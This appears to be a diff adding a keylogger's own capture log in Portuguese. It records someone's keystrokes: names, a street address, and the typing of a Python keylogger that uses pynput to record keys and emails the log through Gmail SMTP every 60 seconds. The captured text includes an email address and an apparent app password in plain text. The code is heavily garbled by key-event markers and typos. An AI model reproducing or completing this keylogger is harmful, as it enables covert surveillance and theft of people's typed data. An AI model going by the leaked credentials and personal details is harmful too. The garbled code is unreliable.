@@ -1,0 +1,74 @@
+minha casa
+[Key.delete] Luiz 
+Marilia
+Rosana
+[Key.delete] quais as maneiras de acessar o postmann Rua 1, nr 2
+luiz< Muito bom.
+keylogger.email.py _	[Key.right] from punput     ynput	 import keybard
+
+import smtplib
+
+from email.mime.text imprt  ort MIMEText
+from threading import Timr er
+
+
+#configuraç~oes de e-mail
+email     email_origem = "demokeylogger0@gmail.com                        demokeylogger0@gmail.com[Key.right] 
+email_destino = "demokeylogger0@gmail.com                        demokeylogger0@gami   mail.com[Key.right] 
+senha  _      senha_email = "wxee vdxg lkws lbyi                   wxee vdxg lkws lbyi[Key.right] 
+
+def enviar_email([Key.right] :
+msg = MIMETes=xt    xt(log[Key.right] 
+msg['subject ' '[Key.right]  = "Dados capturados pelo keylogger[Key.right] 
+msg[["From[Key.right] [Key.right]  = email_origem
+
+msg[To  To[Key.right]  = email_destino
+
+try:    try:
+sever + = smtplib.SMTP("smtp.gmail.com[Key.right] [Key.right] [Key.left]  587[Key.right] 
+server.starttls([Key.right] 
+server.login(email, senha[Key.right] 
+server      server.send_message(msg[Key.right] [Key.right] 
+server.quit([Key.right] r
+[Key.left] [Key.left] [Key.left] [Key.left] except Exception as e:
+print("Erro ao enviar[Key.right] , e[Key.right] 
+
+global log
+if log:
+[Key.delete] [Key.down] [Key.left] [Key.left] [Key.left] [Key.left]        [Key.up]    [Key.left]  [Key.left]   [Key.down]     [Key.down]     [Key.down] [Key.left] [Key.left]     
+
+[Key.left] [Key.left] [Key.left] log = "[Key.right] 
+3 # Agendar           Afe   Agendar o envio a cada 60 segundos
+Timer(60, enviar_email[Key.right] .start([Key.right] 
+                                   origem[Key.right]                   
+
+
+[Key.left] [Key.left] [Key.left] [Key.left] [Key.left] def   def on_press(key[Key.right] :
+global log
+
+try:
+log++ key.char =
+exce[Key.left] AttributeError:
+if key == keyboard.Key.space
+
+:
+[Key.left] [Key.left] [Key.left] [Key.left] 
+ log +=" [Key.right] 
+[Key.left] if key == keiko  board      yboard.Key.enter:
+log[Key.left] [Key.left] [Key.left] [Key.left] [Key.delete] [Key.right] [Key.right] [Key.right]  += "\n[Key.right] 
+[Key.delete] [Key.delete] elif
+[Key.left] [Key.left] [Key.left] [Key.left] elif key[Key.left] [Key.left] [Key.left] board.key   Key.bachspace k[Key.left] :
+log+="[<[Key.right] [Key.right] 
+[Key.left] [Key.left] [Key.left] [Key.left] 
+[Key.left] [Key.left] [Key.left] [Key.left] else:
+pass # Ignorar control, shift, etc....
+[Key.left] 
+# Inicia o keylogger e o envio automatico
+
+witc h keyboard.Listener(on_press=on_o press[Key.right]  as listener:
+[Key.delete]     enviar_([Key.right] 
+liste.join([Key.right] 
+
+log = "[Key.right] "[Key.right] [Key.right] "        
+                 [Key.left] [Key.delete]     ,    ggggggclearc      Mioto       Fico ruim,,,,
+
